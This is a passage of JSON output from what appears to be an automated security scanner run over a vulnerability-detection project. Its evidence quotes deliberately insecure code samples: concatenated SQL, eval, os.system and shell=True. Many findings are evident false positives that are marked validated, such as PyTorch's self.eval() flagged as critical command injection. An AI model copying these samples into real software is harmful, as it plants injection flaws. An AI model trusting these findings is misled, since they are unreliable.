        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "                \"query = 'SELECT * FROM users WHERE id = ' + user_id\",\n                \"cursor.execute('SELECT * FROM data WHERE name = \\\"%s\\\"' % name)\",\n                \"db.query(f'SELECT * FROM accounts WHERE user = {username}')\",\n                \"sql = 'DELETE FROM logs WHERE id = ' + str(log_id); execute(sql)\"\n            ],",
          "line_numbers": [
            116
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-003",
        "title": "SQL Injection in hackerone_dataset_builder.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "                \"query = build_query(table, filters)  # Dynamic query builder\",\n                \"db.raw('SELECT * FROM %s WHERE active = true' % table_name)\",\n                \"admin_query = 'SELECT * FROM admin_' + department\"\n            ]\n        }",
          "line_numbers": [
            128
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in hackerone_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: document.write() with user data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        return {\n            'vulnerable': [\n                \"document.write(userInput)\",\n                \"innerHTML = request.params.message\",\n                \"eval(user_provided_code)\",",
          "line_numbers": [
            135
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in hackerone_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: innerHTML assignment without sanitization",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            'vulnerable': [\n                \"document.write(userInput)\",\n                \"innerHTML = request.params.message\",\n                \"eval(user_provided_code)\",\n                \"<div>\" + comment + \"</div>\"",
          "line_numbers": [
            136
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-003",
        "title": "Cross-Site Scripting in hackerone_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "                \"document.write(userInput)\",\n                \"innerHTML = request.params.message\",\n                \"eval(user_provided_code)\",\n                \"<div>\" + comment + \"</div>\"\n            ],",
          "line_numbers": [
            137
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-004",
        "title": "Cross-Site Scripting in hackerone_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: innerHTML assignment without sanitization",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            ],\n            'ambiguous': [\n                \"innerHTML = processComment(comment)  # Unknown sanitization\",\n                \"render(marked(userMarkdown))  # Markdown processor\",\n                \"$(element).html(filtered_content)\"",
          "line_numbers": [
            147
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-005",
        "title": "Cross-Site Scripting in hackerone_dataset_builder.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        return {\n            'vulnerable': [\n                \"eval(user_code)\",\n                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",",
          "line_numbers": [
            230
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"document.write(userInput)\",\n                \"innerHTML = request.params.message\",\n                \"eval(user_provided_code)\",\n                \"<div>\" + comment + \"</div>\"\n            ],",
          "line_numbers": [
            137
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        return {\n            'vulnerable': [\n                \"eval(user_code)\",\n                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",",
          "line_numbers": [
            230
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            'vulnerable': [\n                \"eval(user_code)\",\n                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",\n                \"subprocess.call(shell_command, shell=True)\"",
          "line_numbers": [
            231
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-004",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: os.system() with string concatenation",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"eval(user_code)\",\n                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",\n                \"subprocess.call(shell_command, shell=True)\"\n            ],",
          "line_numbers": [
            232
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-005",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"eval(user_code)\",\n                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",\n                \"subprocess.call(shell_command, shell=True)\"\n            ],",
          "line_numbers": [
            232
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-006",
        "title": "Command Injection in hackerone_dataset_builder.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: subprocess with shell=True",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"exec(request.params.command)\",\n                \"os.system('echo ' + user_input)\",\n                \"subprocess.call(shell_command, shell=True)\"\n            ],\n            'safe': [",
          "line_numbers": [
            233
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "PT-001",
        "title": "Path Traversal in hackerone_dataset_builder.py",
        "type": "Path Traversal",
        "severity": "High",
        "cvss_score": 7.5,
        "cwe_id": "CWE-22",
        "description": "Path traversal vulnerability: readFile with path concatenation",
        "impact": "Attacker can read arbitrary files on the server, potentially accessing sensitive configuration files, credentials, or source code.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use os.path.basename() to extract filename, validate against whitelist, or use safe_join(). Never trust user input for file paths.",
        "references": [
          "https://owasp.org/www-community/attacks/Path_Traversal",
          "https://cwe.mitre.org/data/definitions/22.html"
        ],
        "evidence": {
          "code_snippet": "            'vulnerable': [\n                \"open(user_filename)\",\n                \"fs.readFile('/uploads/' + filename)\",\n                \"File.read(params[:path])\",\n            ],",
          "line_numbers": [
            250
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Path Validation Check",
        "steps_completed": [
          "\u2713 No path validation",
          "\u2713 File operation detected",
          "\u2713 User input in file path",
          "\u2713 Path concatenation detected",
          "\u2713 Generated path traversal PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "PT-002",
        "title": "Path Traversal in hackerone_dataset_builder.py",
        "type": "Path Traversal",
        "severity": "High",
        "cvss_score": 7.5,
        "cwe_id": "CWE-22",
        "description": "Path traversal vulnerability: File.read with user parameters",
        "impact": "Attacker can read arbitrary files on the server, potentially accessing sensitive configuration files, credentials, or source code.",
        "affected_component": "core/hackerone_dataset_builder.py",
        "remediation": "Use os.path.basename() to extract filename, validate against whitelist, or use safe_join(). Never trust user input for file paths.",
        "references": [
          "https://owasp.org/www-community/attacks/Path_Traversal",
          "https://cwe.mitre.org/data/definitions/22.html"
        ],
        "evidence": {
          "code_snippet": "                \"open(user_filename)\",\n                \"fs.readFile('/uploads/' + filename)\",\n                \"File.read(params[:path])\",\n            ],\n            'safe': [",
          "line_numbers": [
            251
          ],
          "file_path": "core/hackerone_dataset_builder.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Path Validation Check",
        "steps_completed": [
          "\u2713 No path validation",
          "\u2713 File operation detected",
          "\u2713 User input in file path",
          "\u2713 Path concatenation detected",
          "\u2713 Generated path traversal PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in sota_baselines.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            Dictionary with predictions and confidence scores\n        \"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits, probs = self.forward(code_texts)",
          "line_numbers": [
            162
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in sota_baselines.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    def predict(self, code_texts: List[str]) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits, probs = self.forward(code_texts)",
          "line_numbers": [
            211
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-003",
        "title": "Cross-Site Scripting in sota_baselines.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    ) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits = self.forward(x, edge_index, batch)",
          "line_numbers": [
            303
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-004",
        "title": "Cross-Site Scripting in sota_baselines.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    ) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            if graph_data:",
          "line_numbers": [
            408
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in sota_baselines.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            Dictionary with predictions and confidence scores\n        \"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits, probs = self.forward(code_texts)",
          "line_numbers": [
            162
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in sota_baselines.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    def predict(self, code_texts: List[str]) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits, probs = self.forward(code_texts)",
          "line_numbers": [
            211
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in sota_baselines.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    ) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            logits = self.forward(x, edge_index, batch)",
          "line_numbers": [
            303
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-004",
        "title": "Command Injection in sota_baselines.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/sota_baselines.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    ) -> Dict:\n        \"\"\"Predict vulnerabilities\"\"\"\n        self.eval()\n        with torch.no_grad():\n            if graph_data:",
          "line_numbers": [
            408
          ],
          "file_path": "core/sota_baselines.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in vulnerability_verification_module.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: React dangerouslySetInnerHTML",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/vulnerability_verification_module.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            'XSS': {\n                'patterns': [\n                    r'dangerouslySetInnerHTML',\n                    r'innerHTML\\s*=',\n                    r'document\\.write\\s*\\(',",
          "line_numbers": [
            56
          ],
          "file_path": "core/vulnerability_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in vulnerability_verification_module.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
